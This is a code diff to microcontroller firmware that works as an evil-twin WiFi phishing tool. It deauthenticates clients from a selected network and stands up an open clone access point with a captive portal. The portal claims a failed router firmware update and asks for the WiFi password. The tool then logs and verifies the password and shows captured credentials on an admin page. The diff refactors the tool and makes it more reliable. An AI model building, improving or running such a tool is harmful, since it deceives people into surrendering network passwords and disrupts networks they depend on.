@@ -34,7 +34,13 @@ String _correct = "";
 String _tryPassword = "";
 String _log = ""; // captured password attempts, shown on /admin
 String _logRaw = ""; // persisted entries, one per line: uptimeSec\tsid\tpassword
+bool hotspot_active = false;
+bool deauthing_active = false;
 bool verifying = false;
+bool verifyPending = false; // WiFi.begin() is issued from loop() once VERIFY_DELAY_MS has passed
+uint32_t verifyStartMs = 0;
+const uint32_t VERIFY_DELAY_MS = 1000; // settle time after WiFi.disconnect() before WiFi.begin()
+const uint32_t VERIFY_TIMEOUT_MS = 30000; // resume deauth even if the victim's browser never reaches /result
 
 uint32_t totalUptimeSec = 0; // powered-on seconds, accumulated across reboots
 uint32_t bootMillis = 0;
@@ -98,6 +104,65 @@ int purgeOldEntries() {
   return dropped;
 }
 
+// escapes text that reaches the page from outside (SSIDs, passwords)
+String htmlEscape(const String& s) {
+  String out = "";
+  for (unsigned int i = 0; i < s.length(); i++) {
+    char c = s.charAt(i);
+    if (c == '&') out += "&amp;";
+    else if (c == '<') out += "&lt;";
+    else if (c == '>') out += "&gt;";
+    else if (c == '"') out += "&quot;";
+    else if (c == '\'') out += "&#39;";
+    else out += c;
+  }
+  return out;
+}
+
+// strips tags from a trusted constant so it can be used inside <title>
+String plainText(const String& html) {
+  String out = "";
+  bool inTag = false;
+  for (unsigned int i = 0; i < html.length(); i++) {
+    char c = html.charAt(i);
+    if (c == '<') inTag = true;
+    else if (c == '>') inTag = false;
+    else if (!inTag) out += c;
+  }
+  return out;
+}
+
+// the log is tab and newline separated, so control characters are replaced before storing
+String logField(const String& s) {
+  String out = s;
+  for (unsigned int i = 0; i < out.length(); i++) {
+    if ((uint8_t)out.charAt(i) < 0x20) out.setCharAt(i, '?');
+  }
+  return out;
+}
+
+// WPA passphrases are 8-63 printable ASCII characters; anything else can never verify
+bool isValidPassphrase(const String& s) {
+  if (s.length() < 8 || s.length() > 63) return false;
+  for (unsigned int i = 0; i < s.length(); i++) {
+    uint8_t c = s.charAt(i);
+    if (c < 0x20 || c > 0x7E) return false;
+  }
+  return true;
+}
+
+bool hasBssid(const uint8_t* b) {
+  for (int i = 0; i < 6; i++) {
+    if (b[i] != 0) return true;
+  }
+  return false;
+}
+
+// true once a network has been picked (a zero BSSID means nothing is selected)
+bool hasTarget() {
+  return hasBssid(_selectedNetwork.bssid);
+}
+
 String logToHtml() {
   String out = "";
   uint32_t nowSec = effNowSec();
@@ -115,13 +180,13 @@ String logToHtml() {
     String pass = line.substring(t2 + 1);
     uint32_t age = (nowSec > t) ? (nowSec - t) : 0;
     String ageTxt = (age < 60) ? "just now" : (age < 3600) ? String(age / 60) + "m ago" : String(age / 3600) + "h ago";
-    out += "<li><code>" + ssid + "</code> &rarr; <code>" + pass + "</code> <small>(" + ageTxt + ")</small></li>";
+    out += "<li><code>" + htmlEscape(ssid) + "</code> &rarr; <code>" + htmlEscape(pass) + "</code> <small>(" + ageTxt + ")</small></li>";
   }
   return out;
 }
 
 void logAttempt(const String& ssid, const String& pass) {
-  _logRaw += String(effNowSec()) + "\t" + ssid + "\t" + pass + "\n";
+  _logRaw += String(effNowSec()) + "\t" + logField(ssid) + "\t" + logField(pass) + "\n";
   if (_logRaw.length() > 2500) { // cap NVS blob size, drop oldest lines
     int cut = _logRaw.indexOf('\n', _logRaw.length() - 2500);
     if (cut > 0) _logRaw = _logRaw.substring(cut + 1);
@@ -146,7 +211,7 @@ void handleClear() {
 #define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."
 
 String header(String t) {
-  String a = String(_selectedNetwork.ssid);
+  String a = htmlEscape(String(_selectedNetwork.ssid));
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
                "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
                "div { padding: 0.5em; }"
@@ -157,7 +222,7 @@ String header(String t) {
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
                "textarea { width: 100%; }";
   String h = "<!DOCTYPE html><html>"
-             "<head><title>" + a + " :: " + t + "</title>"
+             "<head><title>" + a + " :: " + plainText(t) + "</title>"
              "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
              "<style>" + CSS + "</style>"
              "<meta charset=\"UTF-8\"></head>"
@@ -170,7 +235,7 @@ String footer() {
 }
 
 String indexPage() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
+  return header(TITLE) + "<div>" + BODY + "</div><div><form action='/' method=post><label>WiFi password:</label>" +
          "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
 }
 
@@ -180,9 +245,7 @@ void setup() {
   WiFi.setAutoReconnect(false);
   WiFi.mode(WIFI_AP_STA);
   WiFi.disconnect();
-  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("WiPhi_34732", "d347h320");
-  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+  startControlAP();
 
   webServer.on("/", handleIndex);
   webServer.on("/result", handleResult);
@@ -192,6 +255,29 @@ void setup() {
   webServer.begin();
   loadLog();
   performScan(); // so the admin page has networks right after boot
+}
+
+// control hotspot: WiPhi_34732, what the operator connects to
+void startControlAP() {
+  hotspot_active = false;
+  verifyPending = false; // a check still waiting for its WiFi.begin() must not run against the control AP
+  verifying = false;
+  dnsServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  WiFi.softAP("WiPhi_34732", "d347h320");
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+}
+
+// evil twin: open AP with the target's SSID on the target's channel
+void startEvilTwin() {
+  hotspot_active = true;
+  dnsServer.stop();
+  WiFi.softAPdisconnect(true);
+  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+  //evil twin must live on the victim's channel, otherwise deauth frames hit nothing
+  WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, (uint8_t)_selectedNetwork.ch);
+  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
 }
 
 void performScan() {
@@ -210,29 +296,17 @@ void performScan() {
   }
 }
 
-bool hotspot_active = false;
-bool deauthing_active = false;
-
 void handleResult() {
-  String html = "";
   verifying = false; // done checking (page loads 15s after submission), resume deauth if it was on
   if (WiFi.status() != WL_CONNECTED) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    }
     webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
     Serial.println("Wrong password tried!");
   } else {
-    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
-    hotspot_active = false;
-    dnsServer.stop();
-    int n = WiFi.softAPdisconnect (true);
-    Serial.println(String(n));
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("WiPhi_34732", "d347h320");
-    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+    _correct = "Successfully got password for: " + htmlEscape(_selectedNetwork.ssid) + " Password: " + htmlEscape(_tryPassword);
+    deauthing_active = false; // the board is now a client of the victim network, stop kicking it
+    startControlAP();
     Serial.println("Good password was entered !");
-    Serial.println(_correct);
+    Serial.println("Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword);
   }
 }
 
@@ -246,18 +320,58 @@ String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0
                    "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                    "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
 
-void handleIndex() {
+// control panel, served on / (no evil twin) and /admin
+String controlPage() {
+  String html = _tempHTML;
 
+  // fill the template before any SSID is appended, so SSID text is never read as a placeholder
+  html.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
+  html.replace("{deauth}", deauthing_active ? "stop" : "start");
+  html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
+  html.replace("{hotspot}", hotspot_active ? "stop" : "start");
+  html.replace("{disabled}", hasTarget() ? "" : " disabled");
+
+  for (int i = 0; i < 16; ++i) {
+    if (_networks[i].ssid == "") {
+      break;
+    }
+    String bssid = bytesToStr(_networks[i].bssid, 6);
+    html += "<tr><td>" + htmlEscape(_networks[i].ssid) + "</td><td>" + bssid + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bssid + "'>";
+
+    if (bssid == bytesToStr(_selectedNetwork.bssid, 6)) {
+      html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
+    } else {
+      html += "<button>Select</button></form></td></tr>";
+    }
+  }
+
+  html += "</table>";
+
+  if (_correct != "") {
+    html += "</br><h3>" + _correct + "</h3>";
+  }
+
+  if (_log != "") {
+    html += "</br><h3>Captured password attempts:</h3><ul style='text-align:left;list-style:disc;padding-left:1.5em;'>" + _log + "</ul>";
+    html += "<form method='post' action='/clear'><button style='background-color:#ffcccc'>Delete log</button></form>";
+  }
+
+  html += "</div></body></html>";
+  return html;
+}
+
+// handles ?ap=, ?deauth= and ?hotspot= from the panel; returns true when a hotspot toggle was requested
+bool applyControlArgs() {
   if (webServer.hasArg("ap")) {
     for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
+      if (hasBssid(_networks[i].bssid) && bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
         _selectedNetwork = _networks[i];
       }
     }
   }
 
   if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
+    if (webServer.arg("deauth") == "start" && hasTarget()) {
       deauthing_active = true;
     } else if (webServer.arg("deauth") == "stop") {
       deauthing_active = false;
@@ -265,186 +379,53 @@ void handleIndex() {
   }
 
   if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      //evil twin must live on the victim's channel, otherwise deauth frames hit nothing
-      WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, (uint8_t)_selectedNetwork.ch);
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
+    if (webServer.arg("hotspot") == "start" && hasTarget()) {
+      startEvilTwin();
     } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("WiPhi_34732", "d347h320");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      startControlAP();
     }
+    return true;
+  }
+
+  return false;
+}
+
+void handleIndex() {
+  if (applyControlArgs()) {
+    webServer.send(204);
     return;
   }
 
   if (hotspot_active == false) {
-    String _html = _tempHTML;
-
-    for (int i = 0; i < 16; ++i) {
-      if ( _networks[i].ssid == "") {
-        break;
-      }
-      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
-
-      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
-      } else {
-        _html += "<button>Select</button></form></td></tr>";
-      }
-    }
-
-    if (deauthing_active) {
-      _html.replace("{deauth_button}", "Stop deauthing");
-      _html.replace("{deauth}", "stop");
-    } else {
-      _html.replace("{deauth_button}", "Start deauthing");
-      _html.replace("{deauth}", "start");
-    }
-
-    if (hotspot_active) {
-      _html.replace("{hotspot_button}", "Stop EvilTwin");
-      _html.replace("{hotspot}", "stop");
-    } else {
-      _html.replace("{hotspot_button}", "Start EvilTwin");
-      _html.replace("{hotspot}", "start");
-    }
-
-
-    if (_selectedNetwork.ssid == "") {
-      _html.replace("{disabled}", " disabled");
-    } else {
-      _html.replace("{disabled}", "");
-    }
-
-    _html += "</table>";
-
-    if (_correct != "") {
-      _html += "</br><h3>" + _correct + "</h3>";
-    }
-
-    if (_log != "") {
-      _html += "</br><h3>Captured password attempts:</h3><ul style='text-align:left;list-style:disc;padding-left:1.5em;'>" + _log + "</ul>";
-      _html += "<form method='post' action='/clear'><button style='background-color:#ffcccc'>Delete log</button></form>";
-    }
-
-    _html += "</div></body></html>";
-    webServer.send(200, "text/html", _html);
-
-  } else {
-
-    if (webServer.hasArg("password")) {
-      _tryPassword = webServer.arg("password");
-      logAttempt(_selectedNetwork.ssid, _tryPassword);
-      verifying = true; // pause deauth bursts, otherwise we deauth our own checking connection
-      delay(1000);
-      WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
-    } else {
-      webServer.send(200, "text/html", indexPage());
-    }
-  }
-
-}
-
-void handleAdmin() {
-
-  String _html = _tempHTML;
-
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
-        _selectedNetwork = _networks[i];
-      }
-    }
-  }
-
-  if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    } else if (webServer.arg("deauth") == "stop") {
-      deauthing_active = false;
-    }
-  }
-
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      //evil twin must live on the victim's channel, otherwise deauth frames hit nothing
-      WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, (uint8_t)_selectedNetwork.ch);
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-    } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("WiPhi_34732", "d347h320");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    }
+    webServer.send(200, "text/html", controlPage());
     return;
   }
 
-  for (int i = 0; i < 16; ++i) {
-    if ( _networks[i].ssid == "") {
-      break;
+  if (webServer.hasArg("password")) {
+    String pass = webServer.arg("password");
+    if (!isValidPassphrase(pass)) {
+      webServer.send(200, "text/html", "<html><body><center><h2>Password must be 8-63 printable characters.</h2><a href='/'>Back</a></center></body></html>");
+      return;
     }
-    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
-
-    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
-    } else {
-      _html += "<button>Select</button></form></td></tr>";
-    }
-  }
-
-  if (deauthing_active) {
-    _html.replace("{deauth_button}", "Stop deauthing");
-    _html.replace("{deauth}", "stop");
+    _tryPassword = pass;
+    logAttempt(_selectedNetwork.ssid, _tryPassword);
+    verifying = true; // pause deauth bursts, otherwise we deauth our own checking connection
+    verifyStartMs = millis();
+    verifyPending = true; // WiFi.begin() follows from loop() once the disconnect has settled
+    WiFi.disconnect();
+    webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
   } else {
-    _html.replace("{deauth_button}", "Start deauthing");
-    _html.replace("{deauth}", "start");
+    webServer.send(200, "text/html", indexPage());
+  }
+}
+
+void handleAdmin() {
+  if (applyControlArgs()) {
+    webServer.send(204);
+    return;
   }
 
-  if (hotspot_active) {
-    _html.replace("{hotspot_button}", "Stop EvilTwin");
-    _html.replace("{hotspot}", "stop");
-  } else {
-    _html.replace("{hotspot_button}", "Start EvilTwin");
-    _html.replace("{hotspot}", "start");
-  }
-
-
-  if (_selectedNetwork.ssid == "") {
-    _html.replace("{disabled}", " disabled");
-  } else {
-    _html.replace("{disabled}", "");
-  }
-
-  if (_correct != "") {
-    _html += "</br><h3>" + _correct + "</h3>";
-  }
-
-  _html += "</table></div></body></html>";
-  webServer.send(200, "text/html", _html);
-
+  webServer.send(200, "text/html", controlPage());
 }
 
 String bytesToStr(const uint8_t* b, uint32_t size) {
@@ -471,7 +452,18 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  if (deauthing_active && !verifying && millis() - deauth_now >= 100) {
+  // start the credential check once the disconnect has settled, see handleIndex()
+  if (verifyPending && millis() - verifyStartMs >= VERIFY_DELAY_MS) {
+    verifyPending = false;
+    WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
+  }
+
+  // /result normally clears this flag; clear it here too so a closed victim tab cannot pause deauth forever
+  if (verifying && millis() - verifyStartMs >= VERIFY_TIMEOUT_MS) {
+    verifying = false;
+  }
+
+  if (deauthing_active && hasTarget() && !verifying && millis() - deauth_now >= 100) {
         int channel = _selectedNetwork.ch;
         if (channel >= 1 && channel <= 13) {
             WiFi.setChannel(channel);
@@ -511,7 +503,8 @@ void loop() {
     }
   }
 
-  if (millis() - now >= 15000 && !hotspot_active) {
+  // a blocking scan would switch channels and stall the burst loop, so it waits until deauth is off
+  if (millis() - now >= 15000 && !hotspot_active && !deauthing_active) {
     performScan();
     now = millis();
   }
